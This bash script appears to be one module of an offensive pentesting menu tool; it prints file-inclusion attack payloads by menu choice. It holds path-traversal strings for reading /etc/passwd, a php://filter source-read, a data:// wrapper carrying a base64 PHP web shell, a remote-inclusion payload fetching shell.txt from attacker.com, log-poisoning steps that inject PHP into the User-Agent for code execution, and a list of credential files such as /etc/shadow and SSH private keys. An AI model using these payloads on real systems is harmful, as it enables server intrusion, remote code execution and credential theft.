#!/bin/bash
# HackTricks Ref: file-inclusion
# Module: LFI / RFI (Local & Remote File Inclusion)

echo -e "${C6}[WEB ATTACK: SERVER_LFI_RFI]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Inclusion Vector:${NC}"
echo "1) Basic LFI (Path Traversal)"
echo "2) PHP Wrappers (filter, data, expect)"
echo "3) RFI (Remote File Inclusion)"
echo "4) LFI to RCE (Log Poisoning / /proc/self/fd)"
echo "5) Common Sensitive Files (Linux/Windows)"
echo "0) Exit"

read -p "Selection: " lfi_opt

case $lfi_opt in
    1)
        echo -e "\n${C2}[*] Basic Path Traversal:${NC}"
        echo "Try to escape the web root using ../ sequences:"
        echo " - /view?page=../../../../etc/passwd"
        echo " - /view?page=....//....//....//etc/passwd (Bypass filter)"
        echo " - /view?page=/etc/passwd (Absolute path)"
        ;;
    2)
        echo -e "\n${C2}[*] PHP Wrappers (The Pro Way):${NC}"
        echo -e "${C5}Base64 Encode (Read Source):${NC}"
        echo " php://filter/convert.base64-encode/resource=config.php"
        echo -e "${C5}Data Wrapper (RCE):${NC}"
        echo " data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id"
        ;;
    3)
        echo -e "\n${C2}[*] RFI (Remote File Inclusion):${NC}"
        echo "Requires 'allow_url_include=On' in php.ini."
        echo "Payload: /view?page=http://attacker.com/shell.txt"
        echo "Note: Use a .txt extension on your server so it's not executed there."
        ;;
    4)
        echo -e "\n${C2}[*] LFI to RCE (Log Poisoning):${NC}"
        echo "1. Inject PHP into User-Agent: <?php system(\$_GET['c']); ?>"
        echo "2. Access a log file via LFI: /var/log/apache2/access.log&c=id"
        echo "Other targets: /var/log/auth.log, /proc/self/environ"
        ;;
    5)
        echo -e "\n${C2}[*] High-Value Targets:${NC}"
        echo -e "${C4}Linux:${NC} /etc/passwd, /etc/shadow, /root/.ssh/id_rsa, /var/www/html/.env"
        echo -e "${C4}Windows:${NC} C:\Windows\win.ini, C:\Users\Administrator\.ssh\id_rsa"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
